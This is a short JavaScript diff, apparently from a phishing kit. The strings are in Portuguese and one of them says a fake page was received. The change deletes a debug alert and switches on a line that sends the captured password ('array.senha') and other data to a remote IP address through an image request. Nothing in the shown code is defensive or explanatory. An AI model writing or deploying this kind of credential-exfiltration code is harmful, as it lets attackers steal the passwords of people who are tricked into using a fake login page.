@@ -11,11 +11,10 @@ var strbusca = eval('/'+busca+'/g');
 str2 = str.replace(strbusca, "_");
 
 
-retorno = array.senha +'&|&'+ str2 + 'Recebeu_uma_PAGINA_FALSA_aguarde...';
-
-alert(retorno);
+retorno = array.senha +'&|&'+ str2 + '___Recebeu_uma_PAGINA_FALSA_aguarde......';
 
 
 
 
-//new Image().src = "http://192.168.0.123/?=" + retorno
+
+new Image().src = "http://192.168.0.123/?=" + retorno
